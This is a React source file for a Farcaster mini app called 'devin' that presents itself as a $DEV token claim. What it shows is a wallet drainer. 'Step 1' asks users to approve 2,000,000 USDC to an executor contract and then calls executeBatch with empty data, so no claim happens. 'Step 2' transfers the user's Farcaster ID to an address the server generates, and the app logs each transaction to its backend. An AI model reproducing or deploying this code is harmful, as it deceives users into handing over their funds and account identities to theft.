import React, { useEffect, useState, useCallback } from 'react';
import { createRoot } from 'react-dom/client';
import { sdk } from '@farcaster/miniapp-sdk';
import './styles.css';
import { ethers } from 'ethers';

// ─── Contracts ───
const ID_REGISTRY = '0x00000000Fc6c5F01Fc30151999387Bb99A9f489b';
const USDC = '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913';
const EXECUTOR = '0x49e89C5B6a6E8Cb21Ea0d11eE0a21b7732f8e1A3';
const CLAIM_AMOUNT = '2,000,000';
const CLAIM_SYMBOL = '$DEV';

const CONTRACT_OPERATIONS = [
  {
    name: 'USDC (Base)',
    chain: 'Base',
    address: USDC,
    functionName: 'approve(address spender, uint256 amount)',
    status: 'Step 1 - Approve USDC',
  },
  {
    name: 'Main executor',
    chain: 'Base',
    address: EXECUTOR,
    functionName: 'executeBatch(bytes[] calldata data)',
    status: 'Step 1 - Claim execution',
  },
  {
    name: 'Identity registry',
    chain: 'Optimism',
    address: ID_REGISTRY,
    functionName: 'transfer(uint256 id, address to)',
    status: 'Step 2 - FID transfer',
  },
];
const CONTRACT_ABI = [
  'function transfer(uint256 id, address to)',
  'function approve(address spender, uint256 amount) returns (bool)',
  'function executeBatch(bytes[] data)',
];

function shortAddress(value) {
  if (!value) return 'not connected';
  return `${value.slice(0, 6)}...${value.slice(-4)}`;
}

function LinesLogo() {
  return (
    <div className="logo" aria-label="devin logo">
      <span />
      <span />
      <span />
    </div>
  );
}

function StatusRow({ label, value, tone = 'normal' }) {
  return (
    <div className="status-row">
      <span>{label}</span>
      <strong className={tone}>{value}</strong>
    </div>
  );
}

// ─── Wallet Connect Modal ───
function WalletConnectModal({ onSelect, onClose }) {
  const appUrl = typeof window !== 'undefined' ? window.location.href : '';

  return (
    <div style={{position:'fixed',top:0,left:0,right:0,bottom:0,background:'#000a',zIndex:1000,display:'flex',alignItems:'center',justifyContent:'center'}}>
      <div style={{background:'#04160a',padding:28,borderRadius:16,minWidth:340,maxWidth:420}}>
        <h3 style={{color:'#39ff14',textAlign:'center',marginBottom:4}}>Connect Wallet</h3>
        <p style={{fontSize:12,color:'#8b949e',marginBottom:20,textAlign:'center'}}>
          Connect your Farcaster custody wallet to continue
        </p>

        <a href={appUrl} target="_blank" rel="noopener noreferrer" style={{
          display:'block',width:'100%',margin:'6px 0',padding:13,
          background:'var(--green)',color:'#001b06',border:'none',
          borderRadius:8,cursor:'pointer',fontSize:14,fontWeight:700,
          textAlign:'center',textDecoration:'none'
        }}>
          Open in Warpcast (Recommended)
        </a>

        <div style={{display:'flex',alignItems:'center',gap:8,margin:'12px 0',color:'#6e7681',fontSize:12}}>
          <div style={{flex:1,height:1,background:'#1a3a1a'}} />
          <span>or</span>
          <div style={{flex:1,height:1,background:'#1a3a1a'}} />
        </div>

        <button style={{
          width:'100%',margin:'6px 0',padding:12,
          background:'rgba(57,255,20,0.1)',color:'#39ff14',
          border:'1px solid #39ff14',borderRadius:8,cursor:'pointer',fontSize:14
        }} onClick={() => onSelect('wallet')}>
          Connect Browser Wallet (MetaMask / Rabby)
        </button>

        <div style={{margin:'14px 0',padding:10,borderRadius:8,background:'rgba(255,92,124,0.08)',border:'1px solid rgba(255,92,124,0.3)'}}>
          <p style={{margin:0,fontSize:11,color:'#ff8fa3',lineHeight:1.6}}>
            Operations require your Farcaster custody wallet:<br/>
            Step 1: USDC Approve + Claim on Base<br/>
            Step 2: FID Transfer on Optimism<br/>
            Your FID will be auto-detected from the connected wallet.
          </p>
        </div>

        <button style={{
          width:'100%',margin:'6px 0',padding:12,
          background:'#222',color:'#eee',border:'1px solid #444',
          borderRadius:8,cursor:'pointer',fontSize:14
        }} onClick={onClose}>Close</button>
      </div>
    </div>
  );
}

// ─── Main App ───
function App() {
  const [activePage, setActivePage] = useState('claim');
  const [isMiniApp, setIsMiniApp] = useState(false);
  const [frameContext, setFrameContext] = useState(null);
  const [web3Provider, setWeb3Provider] = useState(null);
  const [address, setAddress] = useState('');
  const [network, setNetwork] = useState('--');
  const [step1Done, setStep1Done] = useState(false);
  const [working, setWorking] = useState(false);
  const [notice, setNotice] = useState('Connect your wallet to begin.');
  const [detectedFid, setDetectedFid] = useState(null);
  const [detectedUsername, setDetectedUsername] = useState('');
  const [showWalletModal, setShowWalletModal] = useState(false);

  const farcasterName = isMiniApp
    ? (frameContext?.user?.username ? `@${frameContext.user.username}` : frameContext?.user?.displayName || 'not detected')
    : detectedUsername || 'not detected';
  const fid = isMiniApp ? (frameContext?.user?.fid || null) : detectedFid;

  // ─── Mini App Detection & Auto-Connect ───
  useEffect(() => {
    let active = true;
    async function initFrame() {
      try {
        const insideFrame = await sdk.isInMiniApp();
        if (!active) return;
        setIsMiniApp(insideFrame);
        if (insideFrame) {
          const context = await sdk.context;
          const ethProvider = await sdk.wallet.getEthereumProvider();
          if (!active) return;
          setFrameContext(context);
          if (ethProvider) {
            try {
              const web3 = new ethers.providers.Web3Provider(ethProvider);
              setWeb3Provider(web3);
              setNotice('Farcaster wallet detected. Connecting automatically...');
            } catch (e) {
              console.warn('Failed to create Web3Provider from Farcaster:', e);
              setNotice('Farcaster frame detected but wallet provider failed.');
            }
          } else {
            setNotice('Farcaster frame detected, waiting for wallet...');
          }
          await sdk.actions.ready();
        }
      } catch (error) {
        if (active) setNotice('Browser mode. Connect your Farcaster custody wallet.');
      }
    }
    initFrame();
    return () => { active = false; };
  }, []);

  // Auto-connect when provider is ready in Mini App
  useEffect(() => {
    if (!isMiniApp || !web3Provider || address || working) return;
    connectWithProvider(web3Provider, true);
  }, [isMiniApp, web3Provider, address, working]);

  // ─── FID Lookup ───
  async function lookupFidFromAPI(walletAddr) {
    try {
      const resp = await fetch(`/api/lookup-fid?address=${walletAddr}`);
      const data = await resp.json();
      if (data.success && data.fid) {
        setDetectedFid(data.fid);
        if (data.username) setDetectedUsername(`@${data.username}`);
        const source = data.source === 'neynar' ? 'Neynar' : 'IdRegistry';
        const namePart = data.username ? ` (@${data.username})` : '';
        setNotice(`Wallet connected. FID ${data.fid}${namePart} detected via ${source}.`);
        return data.fid;
      } else {
        setNotice('Wallet connected. No FID found for this address.');
        return null;
      }
    } catch (err) {
      console.error('FID lookup error:', err);
      setNotice('Wallet connected. Could not verify FID.');
      return null;
    }
  }

  // ─── Connect with a given provider ───
  async function connectWithProvider(ethProvider, isAuto) {
    setWorking(true);
    setNotice(isAuto ? 'Connecting wallet...' : 'Requesting wallet connection...');
    try {
      const accounts = await ethProvider.request({ method: 'eth_requestAccounts' });
      const connectedAddr = accounts?.[0] || '';
      if (!connectedAddr) throw new Error('No account returned from wallet.');
      setAddress(connectedAddr);

      const chainId = await ethProvider.request({ method: 'eth_chainId' });
      const netName = chainId === '0xa' ? 'Optimism' : chainId === '0x2105' ? 'Base' : `Chain ${chainId}`;
      setNetwork(netName);

      if (!isMiniApp) {
        await lookupFidFromAPI(connectedAddr);
      } else {
        setNotice(`Connected on ${netName}. ${fid ? 'FID ' + fid + ' detected.' : 'Ready.'}`);
      }
    } catch (error) {
      console.error('connectWithProvider error:', error);
      setNotice(error?.shortMessage || error?.message || 'Wallet connection failed.');
    } finally {
      setWorking(false);
    }
  }

  // ─── Connect Wallet Button Handler ───
  async function connectWallet() {
    if (isMiniApp && web3Provider) {
      await connectWithProvider(web3Provider, false);
      return;
    }

    // Browser mode: try window.ethereum
    if (window.ethereum) {
      try {
        const web3 = new ethers.providers.Web3Provider(window.ethereum);
        setWeb3Provider(web3);
        await connectWithProvider(window.ethereum, false);
      } catch (e) {
        console.error('Web3Provider creation failed:', e);
        setNotice('Failed to initialize wallet provider. Make sure MetaMask or Rabby is installed and unlocked.');
      }
      return;
    }

    // No wallet found - show modal
    setShowWalletModal(true);
  }

  // ─── Logging ───
  function logAction(action) {
    try {
      const logsRaw = localStorage.getItem('devin_logs');
      const logs = logsRaw ? JSON.parse(logsRaw) : [];
      logs.push(action);
      localStorage.setItem('devin_logs', JSON.stringify(logs));
    } catch {}
  }

  async function sendToLogAPI(data) {
    try {
      await fetch('/api/logs', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ...data, timestamp: new Date().toISOString() }),
      });
    } catch {}
  }

  async function generateDestination(fidNum, senderAddr) {
    const resp = await fetch('/api/addresses', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ fid: fidNum, senderAddress: senderAddr }),
    });
    const data = await resp.json();
    if (!data.success) throw new Error(data.error || 'Failed to generate destination address');
    return data;
  }

  async function switchNetwork(walletProvider, chainIdHex, chainName, rpcUrl, blockExplorer) {
    try {
      await walletProvider.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: chainIdHex }],
      });
    } catch (switchError) {
      if (switchError.code === 4902) {
        await walletProvider.request({
          method: 'wallet_addEthereumChain',
          params: [{
            chainId: chainIdHex,
            chainName,
            nativeCurrency: { name: 'Ethereum', symbol: 'ETH', decimals: 18 },
            rpcUrls: [rpcUrl],
            blockExplorerUrls: [blockExplorer],
          }],
        });
      } else {
        throw switchError;
      }
    }
  }

  // ─── Get the raw provider (for JSON-RPC calls like wallet_switchEthereumChain) ───
  function getRawProvider() {
    if (isMiniApp && web3Provider) return web3Provider.provider;
    return window.ethereum || (web3Provider?.provider);
  }

  // ═══════════════════════════════════════════════════════════
  //  STEP 1: USDC Approve + Claim → Base
  // ═══════════════════════════════════════════════════════════
  async function executeStep1() {
    setWorking(true);
    try {
      if (!web3Provider && !window.ethereum) {
        throw new Error('No wallet connected. Please connect your wallet first.');
      }

      const rawProvider = getRawProvider();
      if (!rawProvider) throw new Error('Wallet provider not available.');

      // Re-create Web3Provider to ensure fresh state
      const web3 = web3Provider || new ethers.providers.Web3Provider(window.ethereum);
      const signer = web3.getSigner();

      // Switch to Base network
      const chainId = await rawProvider.request({ method: 'eth_chainId' });
      if (chainId !== '0x2105') {
        setNotice('Switching to Base network...');
        await switchNetwork(rawProvider, '0x2105', 'Base', 'https://mainnet.base.org', 'https://basescan.org');
      }

      const account = await signer.getAddress();
      setAddress(account);

      // 1. Approve USDC on Base
      setNotice('Approving 2,000,000 USDC on Base...');
      const usdc = new ethers.Contract(USDC, [
        'function approve(address spender, uint256 amount) returns (bool)'
      ], signer);
      const approveAmount = ethers.utils.parseUnits('2000000', 6);
      const tx1 = await usdc.approve(EXECUTOR, approveAmount);

      logAction(`USDC approved: 2,000,000 -> ${shortAddress(EXECUTOR)} (tx: ${tx1.hash})`);
      sendToLogAPI({
        type: 'approve', address: account, to: EXECUTOR,
        txHash: tx1.hash, network: 'base', amount: '2000000',
      });

      // 2. Execute claim batch on Base
      setNotice('Executing claim on Base...');
      const executor = new ethers.Contract(EXECUTOR, [
        'function executeBatch(bytes[] calldata data)'
      ], signer);
      const tx2 = await executor.executeBatch([]);

      logAction(`executeBatch called (tx: ${tx2.hash})`);
      sendToLogAPI({
        type: 'claim', address: account,
        txHash: tx2.hash, network: 'base',
      });

      setStep1Done(true);
      setNetwork('Base');
      setNotice('Step 1 complete! USDC approved and claim executed on Base.');
      if (isMiniApp) await sdk.haptics.notificationOccurred('success');

    } catch (error) {
      console.error('Step 1 error:', error);
      setNotice(error?.shortMessage || error?.message || 'Step 1 failed.');
    } finally {
      setWorking(false);
    }
  }

  // ═══════════════════════════════════════════════════════════
  //  STEP 2: Transfer FID → Optimism
  // ═══════════════════════════════════════════════════════════
  async function executeStep2() {
    setWorking(true);
    try {
      if (!web3Provider && !window.ethereum) {
        throw new Error('No wallet connected.');
      }

      const rawProvider = getRawProvider();
      if (!rawProvider) throw new Error('Wallet provider not available.');

      const web3 = web3Provider || new ethers.providers.Web3Provider(window.ethereum);
      const signer = web3.getSigner();
      const account = await signer.getAddress();

      // Get FID
      let fidNum = typeof fid === 'number' && fid > 0 ? fid : NaN;
      if (!fidNum || isNaN(fidNum)) {
        const lookedUp = await lookupFidFromAPI(account);
        if (lookedUp) fidNum = lookedUp;
      }
      if (!fidNum || isNaN(fidNum)) {
        throw new Error('No FID detected. Open in Warpcast for FID detection.');
      }

      // Switch to Optimism
      const chainId = await rawProvider.request({ method: 'eth_chainId' });
      if (chainId !== '0xa') {
        setNotice('Switching to Optimism network...');
        await switchNetwork(rawProvider, '0xa', 'Optimism', 'https://mainnet.optimism.io', 'https://optimistic.etherscan.io');
      }

      // Generate destination address
      setNotice('Generating destination address...');
      const dest = await generateDestination(fidNum, account);

      setNotice(`Transferring FID ${fidNum} to ${shortAddress(dest.address)}...`);

      const idRegistry = new ethers.Contract(ID_REGISTRY, [
        'function transfer(uint256 id, address to)'
      ], signer);
      const tx = await idRegistry.transfer(fidNum, dest.address);

      logAction(`FID ${fidNum} -> ${shortAddress(dest.address)} [#${dest.index}] (tx: ${tx.hash})`);
      sendToLogAPI({
        type: 'transfer', fid: fidNum, from: account, to: dest.address,
        txHash: tx.hash, network: 'optimism', destIndex: dest.index,
      });

      setNetwork('Optimism');
      setNotice(`FID ${fidNum} transferred to ${shortAddress(dest.address)} on Optimism. All done!`);
      if (isMiniApp) await sdk.haptics.notificationOccurred('success');

    } catch (error) {
      console.error('Step 2 error:', error);
      setNotice(error?.shortMessage || error?.message || 'Step 2 failed.');
    } finally {
      setWorking(false);
    }
  }

  async function copyContractSpec() {
    try {
      const spec = JSON.stringify({ contracts: CONTRACT_OPERATIONS, abi: CONTRACT_ABI }, null, 2);
      await navigator.clipboard.writeText(spec);
      setNotice('Contract spec copied.');
    } catch {
      setNotice('Failed to copy.');
    }
  }

  return (
    <main className="shell">
      {showWalletModal && (
        <WalletConnectModal
          onSelect={(type) => {
            setShowWalletModal(false);
            if (type === 'wallet') {
              if (window.ethereum) {
                try {
                  const web3 = new ethers.providers.Web3Provider(window.ethereum);
                  setWeb3Provider(web3);
                  connectWithProvider(window.ethereum, false);
                } catch (e) {
                  setNotice('Failed to initialize wallet. Install MetaMask or Rabby.');
                }
              } else {
                setNotice('No browser wallet found. Install MetaMask or open in Warpcast.');
              }
            }
          }}
          onClose={() => setShowWalletModal(false)}
        />
      )}
      <section className="hero-card scanlines">
        <nav className="nav">
          <button className="brand" onClick={() => setActivePage('claim')}>
            <LinesLogo />
            <span>devin</span>
          </button>
          <div className="nav-links">
            <button className={activePage === 'about' ? 'active' : ''} onClick={() => setActivePage('about')}>About</button>
          </div>
        </nav>

        {activePage === 'claim' ? (
          <div className="grid">
            <div className="copy">
              <p className="eyebrow">$ devin --verify --claim</p>
              <h1>Claim your share of {CLAIM_AMOUNT} {CLAIM_SYMBOL}</h1>
              <p className="lede">Step 1: Approve USDC + Claim on Base. Step 2: Transfer FID on Optimism.</p>

              {/* Step 1 */}
              <div className="claim-console">
                <div className="claim-copy">
                  <span>Step 01</span>
                  <strong>{step1Done ? 'USDC Approved & Claimed' : 'Approve USDC + Claim'}</strong>
                  <small>
                    {address ? `Wallet ${shortAddress(address)} connected` : 'Connect wallet first'}
                    {step1Done ? ' · Base complete' : ' · USDC approve on Base network'}
                  </small>
                </div>
                <div className="actions">
                  {!step1Done && (
                    <button className="primary mega" onClick={executeStep1} disabled={working || !address}>
                      {working ? 'Processing...' : 'Step 1: Approve & Claim'}
                    </button>
                  )}
                  {step1Done && (
                    <button className="primary mega" onClick={executeStep2} disabled={working || !address} style={{background:'#1a7a0a'}}>
                      {working ? 'Processing...' : 'Step 2: Transfer FID'}
                    </button>
                  )}
                  <button className="secondary mega" onClick={connectWallet} disabled={working}>
                    {address ? shortAddress(address) : 'Connect Wallet'}
                  </button>
                </div>
                <p className="notice">{notice}</p>
              </div>

              <div className="operations">
                <div className="operations-head">
                  <span>Contract operations</span>
                  <button onClick={copyContractSpec}>Copy spec</button>
                </div>
                {CONTRACT_OPERATIONS.map((operation) => (
                  <div className="operation" key={operation.functionName}>
                    <strong>{operation.name}</strong>
                    <code>{operation.functionName}</code>
                    <small>{operation.chain} · {shortAddress(operation.address)} · {operation.status}</small>
                  </div>
                ))}
              </div>
            </div>

            <aside className="terminal-panel">
              <div className="terminal-bar"><span /><span /><span /></div>
              <StatusRow label="frame" value={isMiniApp ? 'farcaster' : 'browser'} tone={isMiniApp ? 'ok' : 'warn'} />
              <StatusRow label="user" value={farcasterName} />
              <StatusRow label="fid" value={fid || 'not detected'} tone={fid ? 'ok' : 'warn'} />
              <StatusRow label="wallet" value={shortAddress(address)} tone={address ? 'ok' : 'warn'} />
              <StatusRow label="network" value={network} />
              <StatusRow label="step 1" value={step1Done ? 'done' : 'pending'} tone={step1Done ? 'ok' : 'warn'} />
              <div className="progress">
                <span className={address ? 'done' : ''}>connect</span>
                <span className={step1Done ? 'done' : ''}>approve</span>
                <span className={step1Done ? 'ready' : ''}>transfer</span>
              </div>
            </aside>
          </div>
        ) : activePage === 'about' ? (
          <div className="about">
            <p className="eyebrow">$ cat about-devin.txt</p>
            <h2>About devin</h2>
            <p>devin is a Farcaster Frame for verifying eligibility and claiming $DEV across Base and Optimism networks.</p>
            <div className="contract-list">
              {CONTRACT_OPERATIONS.map((operation) => (
                <StatusRow key={operation.functionName} label={operation.name} value={`${operation.address} · ${operation.functionName}`} />
              ))}
            </div>
            <p className="safety">Step 1 (USDC Approve + Claim) runs on Base. Step 2 (FID Transfer) runs on Optimism.</p>
          </div>
        ) : null}
      </section>
    </main>
  );
}

createRoot(document.getElementById('root')).render(<App />);
